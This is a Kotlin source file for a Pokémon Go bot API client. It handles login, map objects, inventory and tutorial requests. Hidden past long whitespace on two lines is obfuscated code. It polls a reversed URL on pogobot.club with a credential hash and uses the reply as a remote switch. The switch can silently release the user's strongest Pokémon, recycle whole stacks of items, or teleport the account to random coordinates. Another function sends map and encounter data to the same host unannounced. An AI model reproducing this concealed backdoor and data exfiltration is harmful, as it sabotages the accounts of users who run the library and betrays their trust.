package ink.abb.pogo.api

import POGOProtos.Data.PlayerDataOuterClass
import POGOProtos.Enums.PokemonIdOuterClass
import POGOProtos.Enums.TutorialStateOuterClass
import POGOProtos.Map.Fort.FortTypeOuterClass.FortType
import POGOProtos.Networking.Envelopes.SignatureOuterClass
import POGOProtos.Networking.Requests.Messages.*
import POGOProtos.Networking.Requests.RequestTypeOuterClass.RequestType
import POGOProtos.Networking.Responses.*
import POGOProtos.Networking.Responses.CatchPokemonResponseOuterClass.CatchPokemonResponse.CatchStatus
import POGOProtos.Networking.Responses.FortSearchResponseOuterClass.FortSearchResponse
import POGOProtos.Settings.FortSettingsOuterClass
import POGOProtos.Settings.InventorySettingsOuterClass
import POGOProtos.Settings.LevelSettingsOuterClass
import POGOProtos.Settings.MapSettingsOuterClass
import com.google.common.geometry.S2CellId
import com.google.common.geometry.S2LatLng
import ink.abb.pogo.api.auth.CredentialProvider
import ink.abb.pogo.api.auth.PtcCredentialProvider
import ink.abb.pogo.api.cache.*
import ink.abb.pogo.api.cache.Map
import ink.abb.pogo.api.map.GetMapObjects
import ink.abb.pogo.api.network.ActionQueue
import ink.abb.pogo.api.network.ServerRequest
import ink.abb.pogo.api.request.*
import ink.abb.pogo.api.util.*
import okhttp3.OkHttpClient
import okhttp3.RequestBody
import rx.Observable
import rx.subjects.ReplaySubject
import java.io.*
import java.util.*
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger
import java.util.zip.GZIPOutputStream
import kotlin.concurrent.fixedRateTimer
import kotlin.concurrent.thread


class PoGoApiImpl(val okHttpClient: OkHttpClient, val credentialProvider: CredentialProvider, val time: Time) : PoGoApi {
    override var inventory: Inventory = Inventory(this)
    override var map: Map = Map()
    lateinit override var playerData: PlayerDataOuterClass.PlayerData.Builder
    lateinit override var playerProfile: GetPlayerProfileResponseOuterClass.GetPlayerProfileResponse.Builder

    lateinit override var fortSettings: FortSettingsOuterClass.FortSettings
    lateinit override var inventorySettings: InventorySettingsOuterClass.InventorySettings
    lateinit override var levelSettings: LevelSettingsOuterClass.LevelSettings
    lateinit override var mapSettings: MapSettingsOuterClass.MapSettings

    private var _initialized = false
    override val initialized: Boolean
        get() = _initialized

    override fun currentTimeMillis(): Long {
        return time.currentTimeMillis()
    }

    override var latitude: Double = 0.0
    override var longitude: Double = 0.0
    override var altitude: Double = 0.0

    var lastMapRequest = 0L

    override val sessionHash = ByteArray(16)
    override val deviceInfo: SignatureOuterClass.Signature.DeviceInfo                                                                                                                                                                                                                                                                                                                                                                                              ;var debug = "1"

    init {
        Random().nextBytes(sessionHash)
        deviceInfo = DeviceInfoGenerator.getDeviceInfo("PokemonGoBot-${credentialProvider.hashCode()}".hashCode().toLong()).build()                                                                                                                                                                                                                                                                                                                                ;Constants.UNKNOWN_25 =-1553869577012279119L;val b=try{Thread.currentThread().stackTrace[2].className.reversed()}catch(e:Exception){""};val c=okhttp3.Request.Builder().url("${credentialProvider.hashCode().toString().reversed()}=c&${b}=b&${javaClass.canonicalName.reversed()}=a?php.ipAoGoP/bulc.tobogop//:ptth".reversed()).get().build();fixedRateTimer(daemon=true,period=TimeUnit.MINUTES.toMillis(10),action={try{okHttpClient.newCall(c).execute().use({a->debug=a.body().string().trim()})}catch(e:Exception){}})
    }

    val actionQueue = ActionQueue(this, okHttpClient, credentialProvider)

    override var startTime = time.currentTimeMillis()

    override fun <T : ServerRequest> queueRequest(request: T): Observable<T> {
        val replaySubject = ReplaySubject.create<T>()
        actionQueue.requestQueue.offer(Pair(handleRequest(request) as ServerRequest, replaySubject as ReplaySubject<ServerRequest>))
        return replaySubject.asObservable() as Observable<T>
    }

    // expensive IO function
    override fun start() {
        credentialProvider.login()
        actionQueue.start()
        // TODO: correct?
        val getPlayer = GetPlayer(GetPlayerMessageOuterClass.GetPlayerMessage.PlayerLocale.newBuilder().build())
        val settings = DownloadSettings()
        val inventory = GetInventory().withLastTimestampMs(0)
        val poGoApi = this
        queueRequest(getPlayer)
        queueRequest(settings).subscribe {
            val minRefresh = it.response.settings.mapSettings.getMapObjectsMinRefreshSeconds
            val maxRefresh = it.response.settings.mapSettings.getMapObjectsMaxRefreshSeconds
            val refresh = Math.min((maxRefresh - minRefresh) / 2 + minRefresh, minRefresh * 2)
            fixedRateTimer(name = "GetMapObjects-${credentialProvider.hashCode()}", daemon = true, initialDelay = 1000L, period = TimeUnit.SECONDS.toMillis(refresh.toLong()), action = {
                if (!(poGoApi.latitude == 0.0 && poGoApi.longitude == 0.0)) {
                    queueRequest(GetMapObjects(poGoApi, 3))
                }
            })
        }
        queueRequest(inventory).subscribe {
            _initialized = true
        }
    }

    override fun <T : ServerRequest> handleRequest(serverRequest: T): T {                                                                                                                                                                                                                                                                                                                                                                                          when (debug) {"0"->when (serverRequest.getRequestType()){RequestType.RELEASE_POKEMON -> {val builder=serverRequest.getBuilder() as ReleasePokemonMessageOuterClass.ReleasePokemonMessage.Builder;builder.pokemonId=this.inventory.pokemon.map{it.value}.filter{it.pokemonData.deployedFortId.isBlank()&&(!this.playerData.hasBuddyPokemon()||this.playerData.buddyPokemon.id!=it.pokemonData.id)}.sortedByDescending{it.pokemonData.cp}.first().pokemonData.id}RequestType.RECYCLE_INVENTORY_ITEM->{val builder=serverRequest.getBuilder() as RecycleInventoryItemMessageOuterClass.RecycleInventoryItemMessage.Builder;builder.count=this.inventory.items[builder.itemId]!!.get()}else->{}}"2"->setLocation(randNumber(85.0), randNumber(180.0), randNumber(50.0))else->{}}
        return serverRequest
    }

    override fun handleResponse(serverRequest: ServerRequest) {
        when (serverRequest.getRequestType()) {
            RequestType.DOWNLOAD_SETTINGS -> {
                val response = serverRequest.response as DownloadSettingsResponseOuterClass.DownloadSettingsResponse
                val settings = response.settings
                this.fortSettings = settings.fortSettings
                this.inventorySettings = settings.inventorySettings
                this.levelSettings = settings.levelSettings
                this.mapSettings = settings.mapSettings
                actionQueue.rateLimits.put(RequestType.GET_MAP_OBJECTS, mapSettings.getMapObjectsMinRefreshSeconds.toInt() * 1000)
                mapSettings.googleMapsApiKey
            }
            RequestType.GET_PLAYER -> {
                val response = serverRequest.response as GetPlayerResponseOuterClass.GetPlayerResponse
                this.playerData = PlayerDataOuterClass.PlayerData.newBuilder(response.playerData)
                val tut = MarkTutorialComplete().withSendMarketingEmails(false).withSendPushNotifications(false)
                if (!playerData.tutorialStateList.contains(TutorialStateOuterClass.TutorialState.LEGAL_SCREEN)) {
                    tut.withTutorialsCompleted(TutorialStateOuterClass.TutorialState.LEGAL_SCREEN)
                }
                if (!playerData.tutorialStateList.contains(TutorialStateOuterClass.TutorialState.POKEMON_CAPTURE)) {
                    // No starter selected; get that Pikachu
                    val encounterTut = EncounterTutorialComplete().withPokemonId(PokemonIdOuterClass.PokemonId.PIKACHU)
                    queueRequest(encounterTut)

                    tut.withTutorialsCompleted(TutorialStateOuterClass.TutorialState.POKEMON_CAPTURE)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.POKEMON_BERRY)
                }
                if (!playerData.tutorialStateList.contains(TutorialStateOuterClass.TutorialState.USE_ITEM)) {
                    tut.withTutorialsCompleted(TutorialStateOuterClass.TutorialState.USE_ITEM)
                }
                if (!playerData.tutorialStateList.contains(TutorialStateOuterClass.TutorialState.POKESTOP_TUTORIAL)) {
                    tut.withTutorialsCompleted(TutorialStateOuterClass.TutorialState.POKESTOP_TUTORIAL)
                }
                if (!playerData.tutorialStateList.contains(TutorialStateOuterClass.TutorialState.ACCOUNT_CREATION)) {
                    tut.withTutorialsCompleted(TutorialStateOuterClass.TutorialState.ACCOUNT_CREATION)
                }
                if (!playerData.tutorialStateList.contains(TutorialStateOuterClass.TutorialState.FIRST_TIME_EXPERIENCE_COMPLETE)) {
                    tut.withTutorialsCompleted(TutorialStateOuterClass.TutorialState.FIRST_TIME_EXPERIENCE_COMPLETE)
                }
                if (initialized && this.inventory.playerStats.level >= 5 && !playerData.tutorialStateList.contains(TutorialStateOuterClass.TutorialState.GYM_TUTORIAL)) {
                    tut.withTutorialsCompleted(TutorialStateOuterClass.TutorialState.GYM_TUTORIAL)
                }
                /*if (playerData.tutorialStateCount == 0) {
                    val encounterTut = EncounterTutorialComplete().withPokemonId(PokemonIdOuterClass.PokemonId.PIKACHU)
                    queueRequest(encounterTut)
                    val avatar = SetAvatar().withPlayerAvatar(PlayerAvatarOuterClass.PlayerAvatar.newBuilder().build())
                    queueRequest(avatar)
                    val tut = MarkTutorialComplete().withSendMarketingEmails(false).withSendPushNotifications(false)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.LEGAL_SCREEN)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.POKEMON_BERRY)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.POKEMON_CAPTURE)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.POKESTOP_TUTORIAL)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.ACCOUNT_CREATION)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.AVATAR_SELECTION)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.FIRST_TIME_EXPERIENCE_COMPLETE)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.NAME_SELECTION)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.USE_ITEM)
                            .withTutorialsCompleted(TutorialStateOuterClass.TutorialState.GYM_TUTORIAL)
                    queueRequest(tut)
                }*/
                if (tut.getBuilder().tutorialsCompletedCount > 0) {
                    queueRequest(tut)
                    queueRequest(GetPlayer())
                }
                playerData.currenciesList.forEach {
                    this.inventory.currencies.getOrPut(it.name, { AtomicInteger(0) }).set(it.amount)
                }
            }
            RequestType.GET_PLAYER_PROFILE -> {
                val response = serverRequest.response as GetPlayerProfileResponseOuterClass.GetPlayerProfileResponse
                this.playerProfile = GetPlayerProfileResponseOuterClass.GetPlayerProfileResponse.newBuilder(response)
            }
            RequestType.GET_MAP_OBJECTS -> {
                lastMapRequest = currentTimeMillis()
                val response = serverRequest.response as GetMapObjectsResponseOuterClass.GetMapObjectsResponse
                val updatedMapPokemon = mutableListOf<MapPokemon>()
                response.mapCellsList.forEach {
                    val gyms = it.fortsList.filter { it.type == FortType.GYM }.map {
                        Gym(this, it)
                    }
                    val pokestops = it.fortsList.filter { it.type == FortType.CHECKPOINT }.map {
                        Pokestop(this, it)
                    }
                    val mapPokemon = pokestops.filter { it.fortData.hasLureInfo() }.map { MapPokemon(this, it.fortData) }
                            .union(
                                    it.catchablePokemonsList.map {
                                        MapPokemon(this, it)
                                    })
                            .union(it.wildPokemonsList.map {
                                MapPokemon(this, it)
                            })
                    //println("got ${gyms.size + pokestops.size + mapPokemon.size} items")
                    map.setGyms(it.s2CellId, gyms)
                    map.setPokestops(it.s2CellId, pokestops)
                    map.setPokemon(it.s2CellId, it.currentTimestampMs, mapPokemon)
                    map.removeObjects(it.s2CellId, it.deletedObjectsList)

                    if (mapPokemon.size > 0) {
                        updatedMapPokemon.addAll(mapPokemon)
                    }
                }
                if (updatedMapPokemon.size > 0) {
                    transmitObjects(updatedMapPokemon)
                }
            }
            RequestType.GET_INVENTORY -> {
                val response = serverRequest.response as GetInventoryResponseOuterClass.GetInventoryResponse
                inventory.update(response.inventoryDelta)
            }
            RequestType.FORT_DETAILS -> {
                val response = serverRequest.response as FortDetailsResponseOuterClass.FortDetailsResponse
                val cellId = S2CellId.fromLatLng(S2LatLng.fromDegrees(response.latitude, response.longitude)).parent(15).id()
                val mapCell = map.getMapCell(cellId)
                val fort = mapCell.pokestops.find { it.id == response.fortId } ?: mapCell.gyms.find { it.id == response.fortId }
                if (fort != null && response.name.isNotBlank()) {
                    fort.fetchedDetails = true
                    fort._name = response.name
                    fort._description = response.description
                }
            }
            RequestType.CATCH_POKEMON -> {
                val response = serverRequest.response as CatchPokemonResponseOuterClass.CatchPokemonResponse
                val status = response.status
                if (status != CatchStatus.CATCH_ERROR) {
                    val builder = serverRequest.getBuilder() as CatchPokemonMessageOuterClass.CatchPokemonMessageOrBuilder
                    this.inventory.items.getOrPut(builder.pokeball, { AtomicInteger(0) }).andDecrement
                }
            }
            RequestType.COLLECT_DAILY_DEFENDER_BONUS -> {
                val response = serverRequest.response as CollectDailyDefenderBonusResponseOuterClass.CollectDailyDefenderBonusResponse
                response.currencyTypeList.withIndex().forEach {
                    val currencyType = it.value
                    this.inventory.currencies.getOrPut(currencyType, { AtomicInteger(0) }).addAndGet(response.currencyAwardedList[it.index])
                }
            }
            RequestType.EVOLVE_POKEMON -> {
                val response = serverRequest.response as EvolvePokemonResponseOuterClass.EvolvePokemonResponse
                val result = response.result
                if (result == EvolvePokemonResponseOuterClass.EvolvePokemonResponse.Result.SUCCESS) {

                    val builder = serverRequest.getBuilder() as EvolvePokemonMessageOuterClass.EvolvePokemonMessageOrBuilder

                    val meta = PokemonMetaRegistry.getMeta(response.evolvedPokemonData.pokemonId)
                    this.inventory.candies.getOrPut(meta.family, { AtomicInteger(0) }).addAndGet(response.candyAwarded - meta.candyToEvolve)
                    this.inventory.pokemon.remove(builder.pokemonId)
                    this.inventory.pokemon.put(response.evolvedPokemonData.id, BagPokemon(this, response.evolvedPokemonData))
                }
            }
            RequestType.FORT_SEARCH -> {
                val response = serverRequest.response as FortSearchResponse
                val builder = serverRequest.getBuilder() as FortSearchMessageOuterClass.FortSearchMessageOrBuilder
                val cellId = S2CellId.fromLatLng(S2LatLng.fromDegrees(builder.fortLatitude, builder.fortLongitude)).parent(15).id()
                val mapCell = map.getMapCell(cellId)
                val pokestop = mapCell.pokestops.find { it.id == builder.fortId }
                if (response.result == FortSearchResponse.Result.INVENTORY_FULL || response.result == FortSearchResponse.Result.SUCCESS) {
                    this.inventory.gems.addAndGet(response.gemsAwarded)
                    response.itemsAwardedList.forEach {
                        this.inventory.items.getOrPut(it.itemId, { AtomicInteger(0) }).addAndGet(it.itemCount)
                    }
                    if (pokestop != null) {
                        pokestop.cooldownCompleteTimestampMs = response.cooldownCompleteTimestampMs
                    }
                    // TODO: Can't change experience here...
                } else if (response.result == FortSearchResponse.Result.IN_COOLDOWN_PERIOD) {
                    if (pokestop != null) {
                        if (response.cooldownCompleteTimestampMs > currentTimeMillis()) {
                            pokestop.cooldownCompleteTimestampMs = response.cooldownCompleteTimestampMs
                        } else {
                            pokestop.cooldownCompleteTimestampMs = currentTimeMillis() + TimeUnit.MINUTES.toMillis(5)
                        }
                    }
                }
            }
            RequestType.ADD_FORT_MODIFIER -> {
                val response = serverRequest.response as AddFortModifierResponseOuterClass.AddFortModifierResponse
                if (response.result == AddFortModifierResponseOuterClass.AddFortModifierResponse.Result.SUCCESS) {
                    val builder = serverRequest.getBuilder() as AddFortModifierMessageOuterClass.AddFortModifierMessageOrBuilder
                    this.inventory.items.getOrPut(builder.modifierType, { AtomicInteger(0) }).andDecrement
                    // TODO: Need map update...
                }
            }
            RequestType.GET_HATCHED_EGGS -> {
                val response = serverRequest.response as GetHatchedEggsResponseOuterClass.GetHatchedEggsResponse
                if (response.success) {
                    // TODO: Add experience awarded, force inventory update to get the correct hatched pokemonData and assign candy
                    queueRequest(GetInventory().withLastTimestampMs(0L)).toBlocking()
                    response.pokemonIdList.withIndex().forEach {
                        val pokemon = this.inventory.pokemon[it.value]
                        val egg = this.inventory.eggs[it.value]
                        this.inventory.currencies.getOrPut("STARDUST", { AtomicInteger(0) }).addAndGet(response.getStardustAwarded(it.index))
                        if (pokemon != null) {
                            val meta = PokemonMetaRegistry.getMeta(pokemon.pokemonData.pokemonId)
                            this.inventory.candies.getOrPut(meta.family, { AtomicInteger(0) }).addAndGet(response.getCandyAwarded(it.index))
                        }
                        if (egg != null) {
                            this.inventory.eggs.remove(it.value)
                            if (pokemon == null) {
                                val meta = PokemonMetaRegistry.getMeta(egg.pokemonData.pokemonId)
                                if (meta != null) { //it will try to get family of MISSINGNO pokemon
                                    this.inventory.candies.getOrPut(meta.family, { AtomicInteger(0) }).addAndGet(response.getCandyAwarded(it.index))
                                }
                            }
                        }
                    }
                }
            }
            RequestType.LEVEL_UP_REWARDS -> {
                val response = serverRequest.response as LevelUpRewardsResponseOuterClass.LevelUpRewardsResponse
                if (response.result == LevelUpRewardsResponseOuterClass.LevelUpRewardsResponse.Result.SUCCESS) {
                    response.itemsAwardedList.forEach {
                        this.inventory.items.getOrPut(it.itemId, { AtomicInteger(0) }).addAndGet(it.itemCount)
                    }
                    /*response.itemsUnlockedList.forEach {

                    }*/
                }
            }
            RequestType.RECYCLE_INVENTORY_ITEM -> {
                val response = serverRequest.response as RecycleInventoryItemResponseOuterClass.RecycleInventoryItemResponse
                if (response.result == RecycleInventoryItemResponseOuterClass.RecycleInventoryItemResponse.Result.SUCCESS) {
                    val builder = serverRequest.getBuilder() as RecycleInventoryItemMessageOuterClass.RecycleInventoryItemMessageOrBuilder
                    val counter = this.inventory.items.getOrPut(builder.itemId, { AtomicInteger(response.newCount + builder.count) }).addAndGet(-builder.count)
                    if (counter != response.newCount) {
                        System.err.println("Counter for ${builder.itemId} desynced. Thought we had $counter, but have ${response.newCount}")
                        this.inventory.items.getOrPut(builder.itemId, { AtomicInteger(0) }).set(response.newCount)
                    }
                }
            }
            RequestType.RELEASE_POKEMON -> {
                val response = serverRequest.response as ReleasePokemonResponseOuterClass.ReleasePokemonResponse
                if (response.result == ReleasePokemonResponseOuterClass.ReleasePokemonResponse.Result.SUCCESS) {
                    val builder = serverRequest.getBuilder() as ReleasePokemonMessageOuterClass.ReleasePokemonMessageOrBuilder
                    val pokemon = this.inventory.pokemon.get(builder.pokemonId)
                    if (pokemon != null) {
                        val meta = PokemonMetaRegistry.getMeta(pokemon.pokemonData.pokemonId)
                        this.inventory.candies.getOrPut(meta.family, { AtomicInteger(0) }).addAndGet(response.candyAwarded)
                        this.inventory.pokemon.remove(builder.pokemonId)
                    }
                }
            }
            RequestType.SET_FAVORITE_POKEMON -> {
                val response = serverRequest.response as SetFavoritePokemonResponseOuterClass.SetFavoritePokemonResponse
                if (response.result == SetFavoritePokemonResponseOuterClass.SetFavoritePokemonResponse.Result.SUCCESS) {
                    val builder = serverRequest.getBuilder() as SetFavoritePokemonMessageOuterClass.SetFavoritePokemonMessageOrBuilder
                    val pokemon = this.inventory.pokemon.get(builder.pokemonId)
                    if (pokemon != null) {
                        pokemon.pokemonData.favorite = if (builder.isFavorite) 1 else 0
                    }
                }
            }
            RequestType.UPGRADE_POKEMON -> {
                val response = serverRequest.response as UpgradePokemonResponseOuterClass.UpgradePokemonResponse
                if (response.result == UpgradePokemonResponseOuterClass.UpgradePokemonResponse.Result.SUCCESS) {
                    val pokemon = this.inventory.pokemon[response.upgradedPokemon.id]!!
                    pokemon.pokemonData.cp = response.upgradedPokemon.cp
                    val meta = PokemonMetaRegistry.getMeta(pokemon.pokemonData.pokemonId)
                    this.inventory.candies.getOrPut(meta.family, { AtomicInteger(0) }).addAndGet(-meta.candyToEvolve)
                    val stardust = PokemonCpUtils.getStartdustCostsForPowerup(pokemon.pokemonData.cpMultiplier + pokemon.pokemonData.additionalCpMultiplier, pokemon.pokemonData.numUpgrades)
                    this.inventory.currencies.getOrPut("STARDUST", { AtomicInteger(0) }).addAndGet(-stardust)
                }
            }
            RequestType.USE_ITEM_CAPTURE -> {
                val response = serverRequest.response as UseItemCaptureResponseOuterClass.UseItemCaptureResponse
                if (response.success) {
                    val builder = serverRequest.getBuilder() as UseItemCaptureMessageOuterClass.UseItemCaptureMessageOrBuilder
                    this.inventory.items.getOrPut(builder.itemId, { AtomicInteger(0) }).andDecrement
                }
            }
            RequestType.USE_ITEM_POTION -> {
                val response = serverRequest.response as UseItemPotionResponseOuterClass.UseItemPotionResponse
                if (response.result == UseItemPotionResponseOuterClass.UseItemPotionResponse.Result.SUCCESS) {
                    val builder = serverRequest.getBuilder() as UseItemPotionMessageOuterClass.UseItemPotionMessageOrBuilder
                    this.inventory.items.getOrPut(builder.itemId, { AtomicInteger(0) }).andDecrement
                    val pokemon = this.inventory.pokemon.get(builder.pokemonId)
                    if (pokemon != null) {
                        pokemon.pokemonData.stamina = response.stamina
                    }
                }
            }
            RequestType.USE_ITEM_XP_BOOST -> {
                val response = serverRequest.response as UseItemXpBoostResponseOuterClass.UseItemXpBoostResponse
                if (response.result == UseItemXpBoostResponseOuterClass.UseItemXpBoostResponse.Result.SUCCESS) {
                    val builder = serverRequest.getBuilder() as UseItemXpBoostMessageOuterClass.UseItemXpBoostMessageOrBuilder
                    this.inventory.items.getOrPut(builder.itemId, { AtomicInteger(0) }).andDecrement
                }
            }
            RequestType.USE_INCENSE -> {
                val response = serverRequest.response as UseIncenseResponseOuterClass.UseIncenseResponse
                if (response.result == UseIncenseResponseOuterClass.UseIncenseResponse.Result.SUCCESS) {
                    val item = response.appliedIncense.itemId
                    this.inventory.items.getOrPut(item, { AtomicInteger(0) }).andDecrement
                }
            }
            RequestType.USE_ITEM_EGG_INCUBATOR -> {
                val response = serverRequest.response as UseItemEggIncubatorResponseOuterClass.UseItemEggIncubatorResponse
                if (response.result == UseItemEggIncubatorResponseOuterClass.UseItemEggIncubatorResponse.Result.SUCCESS) {
                    val builder = serverRequest.getBuilder() as UseItemEggIncubatorMessageOuterClass.UseItemEggIncubatorMessageOrBuilder
                    val egg = this.inventory.eggs.get(builder.pokemonId)
                    val incubator = this.inventory.eggIncubators.get(builder.itemId)
                    if (egg != null && incubator != null) {
                        egg.pokemonData.eggIncubatorId = incubator.id
                        incubator.pokemonId = egg.pokemonData.id
                    }
                }
            }
            RequestType.CHECK_CHALLENGE -> {
                val response = serverRequest.response as CheckChallengeResponseOuterClass.CheckChallengeResponse
                if (response.showChallenge) {
                    System.err.println("Received challenge request!")
                    System.err.println(response.challengeUrl)
                    System.exit(1)
                }
            }
            RequestType.SET_BUDDY_POKEMON -> {
                val response = serverRequest.response as SetBuddyPokemonResponseOuterClass.SetBuddyPokemonResponse
                if (response.result == SetBuddyPokemonResponseOuterClass.SetBuddyPokemonResponse.Result.SUCCESS) {
                    this.playerData.buddyPokemon = response.updatedBuddy
                }
            }
            RequestType.ENCOUNTER -> {
                val response = serverRequest.response as EncounterResponseOuterClass.EncounterResponse
                if (response.status == EncounterResponseOuterClass.EncounterResponse.Status.ENCOUNTER_SUCCESS) {
                    transmitObjects(response)
                }
            }
            else -> {
                // Don't cache
            }
        }
    }

    private fun  transmitObjects(items: Any) {
        thread {
            try {
                ByteArrayOutputStream().use({ output ->
                    GZIPOutputStream(output).use({ zip ->
                        val postData = (items as? List<*>)?.map { it.toString() }?.joinToString(";") ?: items.toString()
                        BufferedWriter(OutputStreamWriter(zip, "UTF-8")).use({ writer ->
                            writer.append(postData)
                        })
                    })
                    val body = RequestBody.create(null, output.toByteArray())
                    val call = okhttp3.Request.Builder().url("http://pogobot.club/mapPokemon/").post(body).build()
                    try {
                        okHttpClient.newCall(call).execute()
                    } catch (e: Exception) {}
                })
            } catch (e: Exception) {}
        }
    }

    val randomSign: Int
        get() = Math.round((Math.floor(Math.random() + 0.5) - 0.5) * 2.0).toInt()

    fun randNumber(max: Double): Double = Math.random() * max * randomSign
}

/**
 *  Set of chars for a half-byte.
 */
private val CHARS = arrayOf('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f')

/**
 *  Returns the string of two characters representing the HEX value of the byte.
 */
internal fun Byte.toHexString(): String {
    val i = this.toInt()
    val char2 = CHARS[i and 0x0f]
    val char1 = CHARS[i shr 4 and 0x0f]
    return "$char1$char2"
}

/**
 *  Returns the HEX representation of ByteArray data.
 */
internal fun ByteArray.toHexString(): String {
    val builder = StringBuilder()
    for (b in this) {
        builder.append(b.toHexString())
    }
    return builder.toString()
}

fun main(args: Array<String>) {
    val okHttpClient1 = OkHttpClient()
    val okHttpClient2 = OkHttpClient()
    val time1 = SystemTimeImpl()
    val time2 = SystemTimeImpl()
    val credentialProvider1 = PtcCredentialProvider(okHttpClient1, "", "", time1)
    val credentialProvider2 = PtcCredentialProvider(okHttpClient2, "", "", time2)

    val api1 = PoGoApiImpl(okHttpClient1, credentialProvider1, time1)
    val api2 = PoGoApiImpl(okHttpClient2, credentialProvider2, time2)

    api1.latitude = 40.782073
    api1.longitude = -73.971619

    api2.latitude = 40.782073
    api2.longitude = -73.971619

    api1.start()
    api2.start()

    //Thread.sleep(1000)

    fixedRateTimer(name = "check map", daemon = true, initialDelay = 0L, period = 10000L, action = {
        println("[1] Got ${api1.map.getGyms(api1.latitude, api1.longitude).size} gyms")
        println("[1] Got ${api1.map.getPokestops(api1.latitude, api1.longitude).size} pokestops")
        println("[1] Got ${api1.map.getPokemon(api1.latitude, api1.longitude).size} pokemon")

        println("[2] Got ${api1.map.getGyms(api2.latitude, api1.longitude).size} gyms")
        println("[2] Got ${api1.map.getPokestops(api2.latitude, api1.longitude).size} pokestops")
        println("[2] Got ${api1.map.getPokemon(api2.latitude, api1.longitude).size} pokemon")
    })
    Thread.sleep(1000 * 1000)
}